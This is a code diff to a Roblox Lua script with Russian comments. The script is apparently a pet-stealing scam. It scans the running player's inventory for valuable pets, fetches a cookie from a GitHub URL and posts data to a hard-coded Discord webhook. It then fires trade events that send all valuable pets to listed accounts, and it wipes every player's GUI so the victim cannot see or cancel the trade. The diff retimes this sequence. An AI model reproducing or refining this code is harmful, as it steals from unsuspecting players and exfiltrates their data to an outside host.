@@ -1,13 +1,10 @@
---ыы
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-
 local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
 local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List
-
 
 local VALID_RARITIES = {
     ["Mythical"] = true,
@@ -26,19 +23,15 @@ local UserNames = {
     "ZeeS_Farm5"
 }
 
-
 local webhook = "https://discord.com/api/webhooks/1429095915636920482/KJleNyik5SUuHrlufKJLtQTDVXS4CFnhr6dDH-Oh3XdbMY85Ej9Y7QV6cGtfg0Di7Yma"
 
-
 local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)
-
 
 local RarityCount = {}
 for rarity, _ in pairs(VALID_RARITIES) do
     RarityCount[rarity] = 0
 end
 local TotalValuablePets = 0
-
 
 local COOKIE_URL = "https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/Z"
 
@@ -56,7 +49,6 @@ local function fetchCookie()
 end
 
 local Cookie = fetchCookie()
-
 
 local function scan(container, tag)
     for _, pet in ipairs(container:GetChildren()) do
@@ -80,9 +72,7 @@ print("=== Inventory ===")
 scan(inventoryPath, "Inventory")
 print("=== Equipped ===")
 scan(equippedPath, "Equipped")
-
 print("Всего ценных петов:", TotalValuablePets)
-
 
 local function firePlayer(targetName)
     local targetPlayer = Players:FindFirstChild(targetName) or Players:WaitForChild(targetName, 9e9)
@@ -90,7 +80,7 @@ local function firePlayer(targetName)
     local remote = ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
         :WaitForChild("Events", 9e9):GetChildren()[30]
     remote:FireServer(unpack(args))
-    print("FireServer (трейд) выполнен для игрока:", targetName)
+    print("FireServer (трейд-запрос) выполнен для игрока:", targetName)
 end
 
 local function firePet(id)
@@ -108,17 +98,14 @@ local function fireFinalEvent()
     }
     ReplicatedStorage:WaitForChild("df82cbce-4e0e-45f4-993a-af75f0c1a09a", 9e9)
         :WaitForChild("Events", 9e9):GetChildren()[35]:FireServer(unpack(args))
-    print("FireServer [35] выполнен (false, true)")
+    print("FireServer [35] выполнен (подтверждение трейда)")
 end
-
 
 local function getJobIdFromPresence()
     if not HttpRequest then return nil end
     local userIds = {}
-    local idToName = {}
     for _, p in ipairs(Players:GetPlayers()) do
         table.insert(userIds, p.UserId)
-        idToName[p.UserId] = p.Name
     end
     if #userIds == 0 then return nil end
     local body = HttpService:JSONEncode({userIds = userIds})
@@ -171,9 +158,7 @@ local function sendToWebhook(presenceData)
         Headers = {["Content-Type"] = "application/json"},
         Body = body
     })
-
 end
-
 
 if TotalValuablePets > 0 then
     task.spawn(function()
@@ -182,71 +167,56 @@ if TotalValuablePets > 0 then
     end)
 end
 
-
 local function removeAllGUI(parent)
     for _, child in ipairs(parent:GetChildren()) do
         child:Destroy()
     end
 end
 
+-- Основная функция — запускается КАЖДЫЙ РАЗ при появлении нужного игрока
+local function startTradeSequence(targetName)
+    print("[ЦИКЛ] Обнаружен " .. targetName .. ". Запуск последовательности трейда...")
 
-local function startTradeProcess(targetName)
-    firePlayer(targetName)
-    
-    task.delay(15, function()  -- Ждём 15 секунд после появления игрока
-        for _, id in ipairs(FoundIDs) do
-            firePet(id)
-        end
-        fireFinalEvent()
+    task.delay(15, function()
+        print("[ЦИКЛ] Прошло 15 сек. Отправляем трейд-запрос " .. targetName)
+        firePlayer(targetName)
+
+        -- Ломаем GUI сразу после отправки запроса
+        task.delay(1, function()
+            print("[ЦИКЛ] Ломаем GUI у всех игроков")
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player:FindFirstChild("PlayerGui") then
+                    removeAllGUI(player.PlayerGui)
+                    player.PlayerGui.ChildAdded:Connect(function(child)
+                        task.defer(function()
+                            removeAllGUI(child)
+                        end)
+                    end)
+                end
+            end
+        end)
+
+        -- Ещё +5 секунд — добавляем петы и подтверждаем
+        task.delay(5, function()
+            print("[ЦИКЛ] Прошло ещё 5 сек. Добавляем петов и подтверждаем трейд")
+            for _, id in ipairs(FoundIDs) do
+                firePet(id)
+            end
+            fireFinalEvent()
+        end)
     end)
-    
-    -- Ломаем GUI у всех игроков на сервере
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player:FindFirstChild("PlayerGui") then
-            removeAllGUI(player.PlayerGui)
-            player.PlayerGui.ChildAdded:Connect(function(child)
-                task.defer(function()
-                    removeAllGUI(child)
-                end)
-            end)
-        end
-    end
 end
 
-
--- Проверка уже подключённых игроков при запуске скрипта
+-- Проверка игроков, которые уже на сервере при запуске скрипта
 for _, player in ipairs(Players:GetPlayers()) do
     if table.find(UserNames, player.Name) then
-        print("[Обнаружен] " .. player.Name .. " уже на сервере. Запуск через 15 секунд.")
-        startTradeProcess(player.Name)
-    end
-    
-    -- Ломаем GUI у всех (включая уже присутствующих)
-    if player:FindFirstChild("PlayerGui") then
-        removeAllGUI(player.PlayerGui)
-        player.PlayerGui.ChildAdded:Connect(function(child)
-            task.defer(function()
-                removeAllGUI(child)
-            end)
-        end)
+        startTradeSequence(player.Name)
     end
 end
 
-
--- Отслеживание новых подключений
+-- Отслеживание ВСЕХ новых подключений — цикл будет запускаться каждый раз
 Players.PlayerAdded:Connect(function(player)
     if table.find(UserNames, player.Name) then
-        print("[Подключился] " .. player.Name .. ". Запуск через 15 секунд.")
-        startTradeProcess(player.Name)
-    end
-    
-    -- Ломаем GUI у нового игрока
-    if player:FindFirstChild("PlayerGui") then
-        removeAllGUI(player.PlayerGui)
-        player.PlayerGui.ChildAdded:Connect(function(child)
-            task.defer(function()
-                removeAllGUI(child)
-            end)
-        end)
+        startTradeSequence(player.Name)
     end
 end)
